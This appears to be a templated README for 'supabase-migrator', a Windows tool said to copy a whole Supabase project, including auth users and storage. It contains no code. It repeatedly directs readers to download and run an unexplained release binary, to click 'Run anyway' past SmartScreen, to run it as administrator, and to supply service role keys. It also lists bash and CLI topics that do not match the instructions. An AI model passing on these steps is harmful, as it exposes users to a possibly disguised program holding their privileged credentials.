# 🔄 supabase-migrator - Move your Supabase project with one command

[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/literate-irtish832/supabase-migrator/releases)

## 🧭 Overview

supabase-migrator helps you move a full Supabase project from one place to another. It copies the parts most people need in one run:

- database schema
- table data
- auth users
- storage files
- edge functions

Use it when you want to move a project, make a clone, or keep a backup copy in another Supabase project.

## 💻 What you need

Before you start, make sure you have:

- A Windows PC
- A Supabase account
- Access to both projects: the one you are moving from and the one you are moving to
- Internet access
- Enough free space for your database and files

For the best results, use a recent version of Windows 10 or Windows 11.

## 📥 Download

Visit this page to download:

https://github.com/literate-irtish832/supabase-migrator/releases

On that page:

1. Open the latest release
2. Find the file for Windows
3. Download it
4. Save it to a folder you can find again

If Windows asks for permission, allow the app to run.

## 🪟 Run on Windows

After you download the file:

1. Open the folder where you saved it
2. Double-click the downloaded file
3. If Windows shows a security prompt, choose the option to run it
4. Follow the on-screen steps

If the app opens in a console window, keep that window open until the process ends.

## 🛠️ Setup your Supabase projects

You need two projects:

- Source project: the project you want to copy from
- Target project: the project you want to copy to

Get the following for each project:

- Project URL
- API key or service role key
- Database connection info if the tool asks for it

Make sure the target project is empty or ready to receive the data you want to move.

## 🚀 How to use it

Use supabase-migrator when you want to copy a project in one pass.

Typical flow:

1. Open the app
2. Enter the source project details
3. Enter the target project details
4. Choose what you want to move
5. Start the migration
6. Wait for the process to finish

The tool is built to handle:

- schema migration
- data copy
- user export and import
- storage file transfer
- edge function transfer

If the app asks for a confirmation step, review the project names before you continue.

## 📦 What gets moved

### Schema
Copies your table structure, relationships, indexes, and other database setup.

### Data
Copies rows from your tables so the new project has the same records.

### Auth users
Moves user accounts so sign-in data stays in place.

### Storage files
Copies files from your Supabase storage buckets.

### Edge functions
Moves your edge function code to the target project.

## 🔍 Before you start

Check these items first:

- The source project is complete and up to date
- The target project has enough storage space
- You have permission to read from the source project
- You have permission to write to the target project
- Your network connection is stable

If your project uses large files, expect the transfer to take longer.

## 🧩 Common use cases

Use this tool when you want to:

- move from one Supabase project to another
- create a staging copy of a live app
- back up your Supabase setup
- rebuild a project after a reset
- move work from a test project to a production project

## ⚙️ Example workflow

Here is a simple way to think about the process:

1. Open the release page
2. Download the Windows file
3. Run the app
4. Point it at your old project
5. Point it at your new project
6. Start the migration
7. Check the new project after it finishes

After the run, open your new Supabase project and confirm that:

- tables are present
- row counts look right
- users appear in auth
- storage buckets contain files
- edge functions are available

## 🧪 Troubleshooting

### The app does not open
- Check that the file finished downloading
- Try running it again
- Right-click the file and choose Run as administrator if needed

### The migration stops early
- Check your internet connection
- Make sure the source and target keys are correct
- Confirm that the target project still has room for the data

### Missing tables or data
- Make sure you selected the schema and data options
- Check whether your source project uses custom rules or filters
- Run the process again after fixing the source details

### Storage files do not appear
- Confirm that the storage bucket names are correct
- Make sure the source bucket is not private in a way that blocks access
- Check that the target project allows file uploads

### Auth users did not move
- Confirm that you used the right auth credentials
- Check that the source project allows user export
- Run the auth step again on its own if the app offers that option

## 📂 Folder tips

Keep the download in a simple folder, such as:

- Downloads
- Desktop
- Documents

Avoid moving the file while the app is running.

## 🔐 Privacy and access

This tool works with project data, so treat your keys with care.

Keep your Supabase keys private and store them in a safe place. Use only the keys for the projects you own or manage.

## 📎 Release download

Download the Windows file here:

https://github.com/literate-irtish832/supabase-migrator/releases

Open the latest release, get the Windows build, and run it on your PC

## 🧰 What the tool is for

supabase-migrator is built for users who want a simple way to move a full Supabase setup without copying each part by hand. It helps reduce manual work when you need the same database, users, files, and edge functions in another project

## 🖥️ Windows tips

If Windows SmartScreen appears:

1. Choose More info
2. Select Run anyway if you trust the file
3. Continue with the setup or app launch

If your company PC blocks the file, ask your admin to allow it

## 🧾 Project topics

- auth
- bash
- cli
- database-migration
- edge-functions
- migration-tool
- pg-dump
- postgresql
- storage
- supabase
- supabase-migration